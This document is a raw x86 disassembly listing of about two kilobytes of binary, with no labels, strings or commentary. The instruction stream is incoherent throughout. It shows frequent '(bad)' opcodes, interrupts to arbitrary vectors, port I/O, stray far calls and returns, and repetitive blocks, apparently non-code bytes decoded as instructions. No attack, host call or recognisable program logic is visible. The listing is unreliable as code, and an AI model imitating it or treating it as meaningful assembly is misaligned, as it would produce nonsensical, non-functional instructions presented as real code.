  427211:	cmp    ebx,ecx
  427213:	shr    ebx,cl
  427215:	xchg   edx,eax
  427216:	shr    edx,cl
  427218:	sub    BYTE PTR [ebx+0x13],dl
  42721b:	retf   0x4d8c
  42721e:	push   ebp
  42721f:	pusha  
  427220:	jge    0x427251
  427222:	push   es
  427223:	mov    esp,0xcd808081
  427228:	jbe    0x42723e
  42722a:	int    0x8d
  42722c:	adc    al,0xcd
  42722e:	mov    ebp,ecx
  427230:	cmp    BYTE PTR [ebx],0xf0
  427233:	shl    edx,cl
  427235:	sub    BYTE PTR [ebx],bh
  427237:	jns    0x42720c
  427239:	mov    ebp,0xcad35392
  42723e:	je     0x4271c5
  427240:	ror    ch,1
  427242:	lea    edx,[ecx]
  427244:	int    0x89
  427246:	int    0x96
  427248:	adc    ebp,ecx
  42724a:	and    bh,BYTE PTR [ebx]
  42724c:	psrlq  mm5,mm3
  42724f:	xchg   edx,eax
  427250:	cmp    ebx,ecx
  427252:	shr    edx,cl
  427254:	sub    BYTE PTR [ebx+0x13],dl
  427257:	retf   0x4d8c
  42725a:	rol    BYTE PTR [edx-0x2d],1
  42725d:	int    0x8d
  42725f:	in     eax,dx
  427260:	int    0x89
  427262:	int    0x96
  427264:	in     eax,dx
  427265:	int    0x22
  427267:	cmp    ecx,DWORD PTR [edi]
  427269:	shr    ebx,cl
  42726b:	xchg   edx,eax
  42726c:	cmp    ebx,ecx
  42726e:	shr    edx,cl
  427270:	sub    BYTE PTR [ebx+0x13],dl
  427273:	retf   0x4d8c
  427276:	ror    BYTE PTR [edx-0x2d],1
  427279:	int    0x8d
  42727b:	adc    ebp,ecx
  42727d:	mov    ebp,ecx
  42727f:	xchg   esi,eax
  427280:	adc    ebp,ecx
  427282:	and    bh,BYTE PTR [ebx]
  427284:	(bad)  
  427286:	(bad)  
  427288:	jmp    0x42721c
  42728a:	shr    edx,cl
  42728c:	sub    BYTE PTR [ebx+0x13],dl
  42728f:	retf   0x4d8c
  427292:	push   ebp
  427293:	pusha  
  427294:	jge    0x4272c5
  427296:	push   es
  427297:	cmc    
  427298:	add    BYTE PTR [eax-0x12893280],0xcd
  42729f:	(bad)  
  4272a0:	in     eax,dx
  4272a1:	int    0x89
  4272a3:	int    0x80
  4272a5:	cmp    esi,eax
  4272a7:	shl    edx,cl
  4272a9:	sub    BYTE PTR [ebx],bh
  4272ab:	jns    0x427280
  4272ad:	mov    ebp,0xcad35392
  4272b2:	je     0x427239
  4272b4:	ror    ch,1
  4272b6:	lea    edx,[ecx*8+0x1496cd89]
  4272bd:	int    0x22
  4272bf:	cmp    ecx,DWORD PTR [edi]
  4272c1:	shr    ebx,cl
  4272c3:	xchg   edx,eax
  4272c4:	cmp    ebx,ecx
  4272c6:	shr    edx,cl
  4272c8:	sub    BYTE PTR [ebx+0x13],dl
  4272cb:	retf   0x4d8c
  4272ce:	rol    BYTE PTR [edx-0x2d],1
  4272d1:	int    0x8d
  4272d3:	cmc    
  4272d4:	int    0x89
  4272d6:	int    0x96
  4272d8:	cmc    
  4272d9:	int    0x22
  4272db:	cmp    ecx,DWORD PTR [edi]
  4272dd:	shr    ebx,cl
  4272df:	xchg   edx,eax
  4272e0:	cmp    ebx,ecx
  4272e2:	shr    edx,cl
  4272e4:	sub    BYTE PTR [ebx+0x13],dl
  4272e7:	retf   0x4d8c
  4272ea:	ror    BYTE PTR [edx-0x2d],1
  4272ed:	int    0x8d
  4272ef:	adc    al,0xcd
  4272f1:	mov    ebp,ecx
  4272f3:	xchg   esi,eax
  4272f4:	adc    al,0xcd
  4272f6:	and    bh,BYTE PTR [ebx]
  4272f8:	(bad)  
  4272fa:	(bad)  
  4272fc:	jmp    0x427290
  4272fe:	shr    edx,cl
  427300:	sub    BYTE PTR [ebx+0x13],dl
  427303:	retf   0x4d8c
  427306:	push   ebp
  427307:	pusha  
  427308:	jge    0x427339
  42730a:	push   es
  42730b:	add    DWORD PTR [eax+0x76cd8080],eax
  427311:	in     eax,dx
  427312:	int    0x8d
  427314:	in     eax,dx
  427315:	int    0x89
  427317:	int    0x80
  427319:	cmp    esi,eax
  42731b:	shl    edx,cl
  42731d:	sub    BYTE PTR [ebx],bh
  42731f:	jns    0x4272f4
  427321:	mov    ebp,0xcad35392
  427326:	je     0x4272ad
  427328:	ror    ch,1
  42732a:	(bad)  
  42732b:	cmc    
  42732c:	int    0x89
  42732e:	int    0x96
  427330:	cmc    
  427331:	int    0x22
  427333:	cmp    ecx,DWORD PTR [edi]
  427335:	shr    ebx,cl
  427337:	xchg   edx,eax
  427338:	cmp    ebx,ecx
  42733a:	shr    edx,cl
  42733c:	sub    BYTE PTR [ebx+0x13],dl
  42733f:	retf   0x4d8c
  427342:	rol    BYTE PTR [edx-0x2d],1
  427345:	int    0x8d
  427347:	adc    ebp,ecx
  427349:	mov    ebp,ecx
  42734b:	xchg   esi,eax
  42734c:	adc    ebp,ecx
  42734e:	and    bh,BYTE PTR [ebx]
  427350:	psrlq  mm5,mm3
  427353:	xchg   edx,eax
  427354:	cmp    ebx,ecx
  427356:	shr    edx,cl
  427358:	sub    BYTE PTR [ebx+0x13],dl
  42735b:	retf   0x4d8c
  42735e:	ror    BYTE PTR [edx-0x2d],1
  427361:	int    0x8d
  427363:	in     eax,dx
  427364:	int    0x89
  427366:	int    0x96
  427368:	in     eax,dx
  427369:	int    0x22
  42736b:	cmp    ecx,DWORD PTR [edi]
  42736d:	cmp    ebx,ecx
  42736f:	shr    ebx,cl
  427371:	xchg   edx,eax
  427372:	shr    edx,cl
  427374:	sub    BYTE PTR [ebx+0x13],dl
  427377:	retf   0x4d8c
  42737a:	push   ebp
  42737b:	pusha  
  42737c:	jge    0x427354
  42737e:	xor    bh,cl
  427380:	jbe    0x427352
  427382:	jo     0x427341
  427384:	outs   dx,DWORD PTR ds:[esi]
  427385:	lods   eax,DWORD PTR ds:[esi]
  427386:	add    BYTE PTR [eax],al
  427388:	int    0x8d
  42738a:	pop    ebp
  42738b:	inc    ebx
  42738c:	rcl    esp,cl
  42738e:	push   ss
  42738f:	int    0x76
  427391:	std    
  427392:	int    0x8d
  427394:	std    
  427395:	cmp    esi,eax
  427397:	cmp    edi,DWORD PTR [ecx-0x2d]
  42739a:	repnz sub bl,dl
  42739d:	mov    ebp,0xad35392
  4273a2:	jbe    0x427351
  4273a4:	int    0x76
  4273a6:	stc    
  4273a7:	int    0xa6
  4273a9:	stc    
  4273aa:	int    0x76
  4273ac:	stc    
  4273ad:	int    0x8d
  4273af:	stc    
  4273b0:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4273b6:	xchg   edx,eax
  4273b7:	shr    DWORD PTR [ebp-0x7862acd8],cl
  4273bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273be:	gs int 0x76
  4273c1:	xchg   ebp,eax
  4273c2:	cmp    ecx,DWORD PTR [edi]
  4273c4:	add    al,0xf2
  4273c6:	std    
  4273c7:	add    al,0xad
  4273c9:	std    
  4273ca:	shr    esp,cl
  4273cc:	sub    BYTE PTR [edi+0x12db537d],al
  4273d2:	hlt    
  4273d3:	dec    ecx
  4273d4:	and    DWORD PTR [esi-0x28932cb],eax
  4273da:	int    0x8d
  4273dc:	std    
  4273dd:	cmp    esi,eax
  4273df:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273e2:	repnz sub bl,dl
  4273e5:	mov    ebp,0xcdd35392
  4273ea:	lea    ebp,[ebp+0x52f7d43]
  4273f0:	push   ds
  4273f1:	std    
  4273f2:	add    BYTE PTR [eax],al
  4273f4:	int    0x76
  4273f6:	std    
  4273f7:	int    0x8d
  4273f9:	std    
  4273fa:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273fd:	lock shl edx,cl
  427400:	sub    bl,dl
  427402:	mov    ebp,0xcdd35392
  427407:	lea    ebp,[ebp+0x1ad67d43]
  42740d:	int    0x76
  42740f:	stc    
  427410:	int    0x8d
  427412:	stc    
  427413:	cmp    edi,DWORD PTR [ecx+0x3b]
  427416:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42741d:	push   ebx
  42741e:	shr    ebx,cl
  427420:	jle    0x4273a3
  427422:	add    BYTE PTR [eax+0x5b6324c0],0x0
  427429:	(bad)  
  42742a:	popf   
  42742b:	iret   
  42742c:	jbe    0x427443
  42742e:	jo     0x4273ed
  427430:	jge    0x42740d
  427432:	add    BYTE PTR [eax],al
  427434:	int    0x76
  427436:	std    
  427437:	int    0x8d
  427439:	std    
  42743a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42743d:	lock shl edx,cl
  427440:	sub    bl,dl
  427442:	mov    ebp,0xcdd35392
  427447:	lea    esp,[ebp+0x5bd4d343]
  42744d:	int    0x76
  42744f:	stc    
  427450:	int    0x8d
  427452:	stc    
  427453:	cmp    edi,DWORD PTR [ecx+0x3b]
  427456:	lock shl edx,cl
  427459:	sub    bl,dl
  42745b:	mov    ebp,0xcdd35392
  427460:	lea    esp,[ebp+0x26d4d343]
  427466:	int    0x76
  427468:	stc    
  427469:	int    0x8d
  42746b:	stc    
  42746c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42746f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427476:	push   ebx
  427477:	shl    DWORD PTR [eax+0x5b],cl
  42747a:	iret   
  42747b:	jbe    0x427492
  42747d:	jo     0x42743c
  42747f:	das    
  427480:	cli    
  427481:	add    BYTE PTR [eax],al
  427483:	int    0x76
  427485:	std    
  427486:	int    0x8d
  427488:	std    
  427489:	cmp    edi,DWORD PTR [ecx+0x3b]
  42748c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427493:	push   ebx
  427494:	shl    DWORD PTR [eax+0x5b],cl
  427497:	iret   
  427498:	jbe    0x4274af
  42749a:	jo     0x427459
  42749c:	sti    
  42749d:	stc    
  42749e:	add    BYTE PTR [eax],al
  4274a0:	int    0x76
  4274a2:	popf   
  4274a3:	xchg   ebp,eax
  4274a5:	or     dh,BYTE PTR [esi+0x14]
  4274a8:	add    dh,dl
  4274aa:	cmp    eax,0xcd14d600
  4274af:	jbe    0x4274e6
  4274b1:	xchg   DWORD PTR [esi-0x78],esi
  4274b4:	jo     0x427473
  4274b6:	push   edx
  4274b7:	fild   DWORD PTR [eax]
  4274b9:	add    ch,cl
  4274bb:	jbe    0x4274ba
  4274bd:	int    0x8d
  4274bf:	std    
  4274c0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274c3:	lock shl edx,cl
  4274c6:	sub    bl,dl
  4274c8:	mov    ebp,0xcdd35392
  4274cd:	lea    esp,[ebp-0x592b2cbd]
  4274d3:	int    0x76
  4274d5:	stc    
  4274d6:	int    0x8d
  4274d8:	stc    
  4274d9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274dc:	lock shl edx,cl
  4274df:	sub    bl,dl
  4274e1:	mov    ebp,0xcdd35392
  4274e6:	lea    esp,[ebp+0x32d4d343]
  4274ec:	int    0x76
  4274ee:	stc    
  4274ef:	int    0x8d
  4274f1:	stc    
  4274f2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274f5:	mov    ebp,0xd3f03b92
  4274fa:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274fe:	jo     0x427500
  427500:	(bad)  
  427501:	cmp    eax,0x873576cd
  427506:	jbe    0x427490
  427508:	jo     0x4274c7
  42750a:	add    eax,0xcd0000f9
  42750f:	jbe    0x42750e
  427511:	int    0x8d
  427513:	std    
  427514:	cmp    edi,DWORD PTR [ecx-0x2d]
  427517:	mov    ebp,0xd3f03b92
  42751c:	repnz sub BYTE PTR [ebx-0x2d],dl
  427520:	jo     0x427522
  427522:	(bad)  
  427523:	cmp    eax,0x873576cd
  427528:	jbe    0x4274b2
  42752a:	jo     0x4274e9
  42752c:	jb     0x427527
  42752e:	add    BYTE PTR [eax],al
  427530:	int    0x8d
  427532:	inc    ebp
  427533:	int    0x76
  427535:	inc    ebp
  427536:	cmp    ecx,ecx
  427538:	cmp    ecx,DWORD PTR [edi]
  42753a:	shr    ebx,cl
  42753c:	xchg   edx,eax
  42753d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427543:	lea    ebp,ds:0x803fd33b
  427549:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427553:	jo     0x427555
  427555:	(bad)  
  427556:	cmp    eax,0x87358dcd
  42755b:	lea    ecx,[eax+0xa95abd]
  427561:	add    ch,cl
  427563:	jbe    0x427595
  427565:	int    0x8d
  427567:	cmp    eax,0x76cd8881
  42756c:	cmp    eax,0xabd7687
  427571:	jbe    0x427530
  427573:	int    0x76
  427575:	stc    
  427576:	int    0x8d
  427578:	stc    
  427579:	cmp    esi,eax
  42757b:	shl    edx,cl
  42757d:	sub    BYTE PTR [ebx],bh
  42757f:	jns    0x427554
  427581:	mov    ebp,0xcdd35392
  427586:	lea    edi,[ebp-0x322c2ed1]
  42758c:	(bad)  
  42758d:	std    
  42758e:	int    0x96
  427590:	std    
  427591:	cmp    ecx,DWORD PTR [edi]
  427593:	cmp    ebx,ecx
  427595:	shr    ebx,cl
  427597:	xchg   edx,eax
  427598:	shr    edx,cl
  42759a:	sub    BYTE PTR [ebx+0x13],dl
  42759d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  4275a3:	or     edi,DWORD PTR [ecx]
  4275a5:	cli    
  4275a6:	add    BYTE PTR [eax],al
  4275a8:	int    0x76
  4275aa:	mov    BYTE PTR [edx-0x2d349c58],ch
  4275b0:	xor    BYTE PTR [eax+0x4edcd96],al
  4275b6:	in     eax,dx
  4275b7:	adc    al,0x5b
  4275b9:	cwde   
  4275ba:	call   0xcd34:0x76cd6d3b
  4275c1:	add    DWORD PTR ds:0xcd808081,ebp
  4275c7:	xchg   esi,eax
  4275c8:	mov    ch,cl
  4275ca:	or     ch,0xd6
  4275cd:	dec    esp
  4275ce:	int    0xe6
  4275d0:	mov    ch,cl
  4275d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275d3:	dec    esp
  4275d4:	or     dh,BYTE PTR [esi-0x3]
  4275d7:	pop    edi
  4275d8:	jnp    0x427611
  4275da:	ficom  WORD PTR [ebx]
  4275dc:	cmp    esp,ebx
  4275de:	pop    ebp
  4275df:	mov    ebp,0x3b25230a
  4275e4:	adc    DWORD PTR [edi],ebp
  4275e6:	inc    ebp
  4275e7:	sti    
  4275e8:	xchg   edx,eax
  4275e9:	shr    ecx,cl
  4275eb:	sub    BYTE PTR [edx],dl
  4275ed:	clc    
  4275ee:	add    BYTE PTR [eax-0x102c9380],0x92
  4275f5:	cmp    ebx,ebp
  4275f7:	push   ebx
  4275f8:	clc    
  4275f9:	int    0xe6
  4275fb:	sbb    al,0x53
  4275fd:	aad    0x43
  4275ff:	(bad)  
  427601:	sbb    eax,DWORD PTR [ebx-0xc]
  427604:	(bad)  
  427605:	das    
  427606:	adc    cl,BYTE PTR [ebp+0x59]
  427609:	je     0x4275b5
  42760b:	push   edi
  42760c:	ja     0x4275d3
  42760e:	xchg   edi,eax
  42760f:	shr    ebx,0xd9
  427612:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  42761c:	xchg   esi,eax
  42761d:	mov    ch,cl
  42761f:	(bad)  
  427620:	dec    esp
  427621:	int    0x96
  427623:	mov    ch,cl
  427625:	(bad)  
  427626:	dec    esp
  427627:	int    0xe6
  427629:	mov    ch,cl
  42762b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42762c:	dec    esp
  42762d:	cmp    edx,DWORD PTR [ecx]
  42762f:	cmp    esp,ebx
  427631:	das    
  427632:	inc    ebp
  427633:	sti    
  427634:	xchg   edx,eax
  427635:	shr    ecx,cl
  427637:	sub    BYTE PTR [edx],dl
  427639:	clc    
  42763a:	add    BYTE PTR [eax-0x22c49380],0x53
  427641:	aad    0xd3
  427643:	out    dx,eax
  427644:	xchg   edx,eax
  427645:	push   ebx
  427646:	clc    
  427647:	int    0xe6
  427649:	xor    ch,cl
  42764b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42764c:	adc    al,0x3b
  42764e:	popf   
  42764f:	int    0x76
  427651:	xor    BYTE PTR [ebx],bh
  427653:	cli    
  427654:	int    0x8d
  427656:	adc    al,0x2f
  427658:	inc    ebp
  427659:	loope  0x4275ed
  42765b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427661:	cli    
  427662:	push   esi
  427663:	add    BYTE PTR [eax-0x132c9380],0x92
  42766a:	push   ebx
  42766b:	popf   
  42766c:	int    0x76
  42766e:	mov    BYTE PTR [edi-0x320be427],al
  427674:	bswap  ebp
  427676:	(bad)  
  427677:	dec    esp
  427678:	int    0xe6
  42767a:	xor    ch,cl
  42767c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42767d:	adc    al,0x4
  42767f:	lods   eax,DWORD PTR ds:[esi]
  427680:	std    
  427681:	add    al,0xe9
  427683:	std    
  427684:	shr    ebx,cl
  427686:	sub    BYTE PTR [ebx],bh
  427688:	ficom  DWORD PTR [esi-0x2c]
  42768b:	aaa    
  42768c:	ficom  WORD PTR [ebx]
  42768e:	adc    dh,bh
  427690:	mov    ebp,0x1225230a
  427695:	clc    
  427696:	aam    0x37
  427698:	ficom  WORD PTR [ebx]
  42769a:	adc    dh,ah
  42769c:	mov    ebp,0x8725230a
  4276a1:	leave  
  4276a2:	sbb    esi,esp
  4276a4:	push   ebx
  4276a5:	jge    0x4276fa
  4276a7:	cdq    
  4276a8:	pop    ebp
  4276a9:	mov    ebp,0x1225230a
  4276ae:	add    dl,dh
  4276b0:	aaa    
  4276b1:	ficom  WORD PTR [ebx]
  4276b3:	cmp    esi,ecx
  4276b5:	adc    bh,dl
  4276b7:	out    0x37,al
  4276b9:	ficom  WORD PTR [ebx]
  4276bb:	(bad)  
  4276bc:	sbb    eax,DWORD PTR [ebx-0xf]
  4276bf:	(bad)  
  4276c0:	das    
  4276c1:	adc    dl,BYTE PTR [esi-0x1]
  4276c4:	das    
  4276c5:	stos   DWORD PTR es:[edi],eax
  4276c6:	push   es
  4276c7:	in     eax,0x9b
  4276c9:	xchg   edi,eax
  4276ca:	imul   bl
  4276cc:	and    al,0x81
  4276ce:	add    BYTE PTR [eax-0x32776933],0xd6
  4276d5:	dec    esp
  4276d6:	int    0xa6
  4276d8:	mov    ch,cl
  4276da:	out    0x4c,al
  4276dc:	cmp    edx,DWORD PTR [ecx]
  4276de:	pop    edi
  4276df:	jnp    0x427718
  4276e1:	ficom  WORD PTR [ebx]
  4276e3:	cmp    esp,ebx
  4276e5:	das    
  4276e6:	inc    ebp
  4276e7:	sti    
  4276e8:	xchg   edx,eax
  4276e9:	shr    edi,cl
  4276eb:	xchg   edx,eax
  4276ec:	cmp    eax,DWORD PTR [eax]
  4276ee:	shl    ebp,cl
  4276f0:	sub    BYTE PTR [edx],cl
  4276f2:	(bad)  
  4276f3:	cmc    
  4276f4:	push   ebx
  4276f5:	fxch   st(5)
  4276f7:	out    0xf5,al
  4276f9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  427703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427704:	and    al,0xcd
  427706:	and    ecx,DWORD PTR [edx]
  427708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427709:	adc    DWORD PTR [ebx-0x1e],eax
  42770c:	(bad)  
  42770d:	xchg   BYTE PTR [ebx],bh
  42770f:	fiadd  DWORD PTR [ebx-0x27]
  427712:	aam    0x20
  427714:	add    dh,dl
  427716:	xor    al,0xcd
  427718:	(bad)  
  427719:	and    al,0x0
  42771b:	(bad)  
  42771c:	sub    al,0x0
  42771e:	(bad)  
  42771f:	std    
  427720:	add    BYTE PTR [eax-0x43],bl
  427723:	sub    edi,eax
  427725:	add    BYTE PTR [eax],al
  427727:	or     al,BYTE PTR [esi-0x7f7f9615]
  42772d:	or     ch,0x96
  427730:	mov    ch,cl
  427732:	out    0x4c,al
  427734:	cmp    edi,ecx
  427736:	cmp    esp,ebx
  427738:	das    
  427739:	inc    ebp
  42773a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427740:	out    0xf5,al
  427742:	int    0xe6
  427744:	mov    ch,cl
  427746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427747:	dec    esp
  427748:	shr    ecx,cl
  42774a:	sub    BYTE PTR [ebx],bh
  42774c:	dec    ebp
  42774e:	(bad)  
  42774f:	cmc    
  427750:	cmp    ebx,ebp
  427752:	push   ebx
  427753:	clc    
  427754:	int    0xe6
  427756:	xor    BYTE PTR [ebx],bh
  427758:	cli    
  427759:	push   ebx
  42775a:	aad    0xcd
  42775c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42775d:	adc    al,0x3b
  42775f:	popf   
  427760:	int    0xc9
  427762:	int    0xe6
  427764:	xor    ch,cl
  427766:	or     al,0xcd
  427768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427769:	adc    al,0x2f
  42776b:	inc    ebp
  42776c:	jge    0x427700
  42776e:	shr    ecx,cl
  427770:	sub    BYTE PTR [ebx],bh
  427772:	fst    st(3)
  427774:	jmp    0x427708
  427776:	adc    bh,al
  427778:	add    BYTE PTR [eax-0x3aac9380],0x53
  42777f:	lock inc ebx
  427781:	icebp  
  427782:	(bad)  
  427783:	sbb    BYTE PTR [ebx+0x2],al
  427786:	(bad)  
  427787:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42778d:	mov    esi,0xdd8bf56d
  427792:	(bad)  
  427793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427794:	cmp    edi,esp
  427796:	sbb    eax,0xcd62ec76
  42779b:	jbe    0x427725
  42779d:	int    0x8d
  42779f:	dec    esp
  4277a0:	int    0x96
  4277a2:	mov    ch,cl
  4277a4:	(bad)  
  4277a5:	dec    esp
  4277a6:	adc    al,BYTE PTR [edx]
  4277a8:	mov    ebp,0x5625230a
  4277ad:	jnp    0x4277e6
  4277af:	ficom  WORD PTR [ebx]
  4277b1:	das    
  4277b2:	inc    ebp
  4277b3:	jge    0x427747
  4277b5:	int    0xfb
  4277b7:	cmp    eax,DWORD PTR [eax]
  4277b9:	cmp    ebx,edx
  4277bb:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  4277c1:	jmp    0x427755
  4277c3:	adc    dh,bh
  4277c5:	add    BYTE PTR [eax-0x36ac9380],0x53
  4277cc:	divps  xmm6,XMMWORD PTR [esi-0x3]
  4277d0:	(bad)  
  4277d1:	test   BYTE PTR [ebx-0x1d],al
  4277d4:	aam    0x4c
  4277d6:	adc    al,BYTE PTR [esi-0x3e]
  4277d9:	gs sub al,0x1
  4277dc:	jo     0x427818
  4277de:	mov    edx,0x124aece0
  4277e3:	ss inc edx
  4277e5:	das    
  4277e6:	sbb    edx,esi
  4277e8:	mov    ebx,0xaa029f75
  4277ed:	test   al,0x63
  4277ef:	retf   
  4277f0:	shr    BYTE PTR [eax+eax*4],cl
  4277f3:	xchg   esi,eax
  4277f4:	int    0xed
  4277f6:	add    al,0xed
  4277f8:	dec    esp
  4277f9:	int    0x76
  4277fb:	mov    ch,cl
  4277fd:	lea    ecx,[edi+ebp*1+0x45]
  427801:	jge    0x427795
  427803:	shr    ebx,cl
  427805:	xchg   edx,eax
  427806:	int    0x8d
  427808:	mov    ch,cl
  42780a:	xchg   esi,eax
  42780b:	dec    esp
  42780c:	cwde   
  42780d:	shl    edx,cl
  42780f:	sub    ch,cl
  427811:	lea    ebx,[ecx+ebp*2]
  427814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427815:	mov    esi,0x793b4229
  42781a:	cmp    ebx,edx
  42781c:	push   ebx
  42781d:	ror    BYTE PTR [edx],cl
  42781f:	or     ebp,0x1cd2476
  427825:	xor    eax,0xcd808081
  42782a:	mov    ch,cl
  42782c:	jbe    0x427852
  42782e:	int    0x1
  427830:	xor    eax,0xcd808081
  427835:	add    BYTE PTR [edi-0x72329b92],0x24
  42783c:	int    0xa
  42783e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427844:	adc    al,0xc0
  427846:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42784d:	nop
  42784e:	jo     0x4278b2
  427850:	add    bl,ah
  427852:	or     cl,BYTE PTR [ebx-0x32778933]
  427858:	lea    ecx,[edi+ebp*1+0x45]
  42785c:	jge    0x4277f0
  42785e:	shr    ebx,cl
  427860:	xchg   edx,eax
  427861:	int    0x8d
  427863:	mov    ch,cl
  427865:	xchg   esi,eax
  427866:	dec    esp
  427867:	add    dh,dl
  427869:	and    al,0x3b
  42786b:	jns    0x4278a8
  42786d:	ficom  DWORD PTR [ebx-0x2e]
  427870:	or     dh,BYTE PTR [esi-0x3]
  427873:	iret   
  427874:	jbe    0x427873
  427876:	jo     0x427812
  427878:	add    dh,dl
  42787a:	sbb    al,0xd3
  42787c:	repnz sub BYTE PTR [eax],al
  42787f:	(bad)  
  427880:	adc    al,0x0
  427882:	(bad)  
  427883:	xor    BYTE PTR [eax],al
  427885:	(bad)  
  427886:	dec    esp
  427887:	add    dh,dl
  427889:	mov    BYTE PTR [ebp+0xfe2b],bh
  42788f:	int    0x76
  427891:	mov    ch,cl
  427893:	lea    ecx,[edi+ebp*1+0x45]
  427897:	jge    0x42782b
  427899:	shr    ebx,cl
  42789b:	xchg   edx,eax
  42789c:	int    0x8d
  42789e:	mov    ch,cl
  4278a0:	xchg   esi,eax
  4278a1:	dec    esp
  4278a2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4278a5:	fcmovbe st,st(3)
  4278a7:	repnz sub ch,cl
  4278aa:	das    
  4278ab:	push   ebx
  4278ac:	rol    BYTE PTR [ebx+0x7d],cl
  4278af:	aam    0x36
  4278b1:	int    0x76
  4278b3:	xor    ch,cl
  4278b5:	lea    edx,[edi+ebp*1]
  4278b8:	inc    ebp
  4278b9:	jge    0x42784d
  4278bb:	shr    ebx,cl
  4278bd:	xchg   edx,eax
  4278be:	int    0x8d
  4278c0:	xor    ch,cl
  4278c2:	xchg   esi,eax
  4278c3:	adc    al,0x3b
  4278c5:	jns    0x427902
  4278c7:	fcmovbe st,st(3)
  4278c9:	repnz sub ch,cl
  4278cc:	lea    ebx,[ebx+edx*2]
  4278cf:	shr    BYTE PTR [edi],cl
  4278d1:	shl    DWORD PTR [esi-0x3],1
  4278d4:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  4278da:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  4278e1:	call   0xcd3c:0xd6cd6d3b
  4278e8:	xchg   esi,eax
  4278e9:	inc    esp
  4278ea:	int    0xe6
  4278ec:	and    al,0x5d
  4278ee:	mov    ebp,0x5f25230a
  4278f3:	jnp    0x42792c
  4278f5:	ficom  WORD PTR [ebx]
  4278f7:	inc    ebx
  4278f8:	icebp  
  4278f9:	das    
  4278fa:	or     BYTE PTR [edi],al
  4278fc:	add    BYTE PTR [eax-0x4613080],0x82
  427903:	test   BYTE PTR [ebx-0xc],al
  427906:	jnp    0x4278ee
  427908:	inc    ebx
  427909:	hlt    
  42790a:	(bad)  
  42790b:	mov    BYTE PTR [ebx-0xf],al
  42790e:	das    
  42790f:	add    eax,0x80809216
  427914:	adc    bh,bh
  427916:	jno    0x42794f
  427918:	ficom  WORD PTR [ebx]
  42791a:	(bad)  
  42791b:	mov    BYTE PTR [ebx-0xf],al
  42791e:	das    
  42791f:	add    eax,0x80809285
  427924:	adc    bh,bh
  427926:	xchg   esi,eax
  427927:	aaa    
  427928:	ficom  WORD PTR [ebx]
  42792a:	(bad)  
  42792b:	mov    BYTE PTR [ebx-0xf],al
  42792e:	das    
  42792f:	add    eax,0x808080f8
  427934:	adc    bh,bh
  427936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427937:	aaa    
  427938:	ficom  WORD PTR [ebx]
  42793a:	(bad)  
  42793b:	test   BYTE PTR [ebx-0xf],al
  42793e:	aam    0x3e
  427940:	adc    bh,bh
  427942:	scas   al,BYTE PTR es:[edi]
  427943:	aaa    
  427944:	ficom  WORD PTR [ebx]
  427946:	(bad)  
  427947:	mov    BYTE PTR [ebx-0xf],al
  42794a:	das    
  42794b:	add    eax,0x808081db
  427950:	adc    bh,bh
  427952:	mov    dh,0x37
  427954:	ficom  WORD PTR [ebx]
  427956:	das    
  427957:	push   es
  427958:	into   
  427959:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427963:	sub    bl,0x12
  427966:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427970:	(bad)  
  427971:	adc    al,0x0
  427973:	(bad)  
  427974:	xor    BYTE PTR [eax],al
  427976:	(bad)  
  427977:	dec    esp
  427978:	add    dh,dl
  42797a:	mov    BYTE PTR [ebp+0xff77],bh
  427980:	jmp    0x427938
  427982:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42798c:	mov    BYTE PTR [ebx-0xf],al
  42798f:	das    
  427990:	add    eax,0x80808019
  427995:	adc    bh,bh
  427997:	xchg   ecx,eax
  427998:	aaa    
  427999:	ficom  WORD PTR [ebx]
  42799b:	(bad)  
  42799c:	mov    BYTE PTR [ebx-0xf],al
  42799f:	das    
  4279a0:	add    eax,0x8080818e
  4279a5:	adc    bh,bh
  4279a7:	(bad)  
  4279a8:	aaa    
  4279a9:	ficom  WORD PTR [ebx]
  4279ab:	(bad)  
  4279ac:	test   BYTE PTR [ebx-0xf],al
  4279af:	aam    0x1c
  4279b1:	adc    bh,bh
  4279b3:	fidiv  WORD PTR [edi]
  4279b5:	ficom  WORD PTR [ebx]
  4279b7:	(bad)  
  4279b8:	mov    BYTE PTR [ebx-0xf],al
  4279bb:	das    
  4279bc:	add    eax,0x80808142
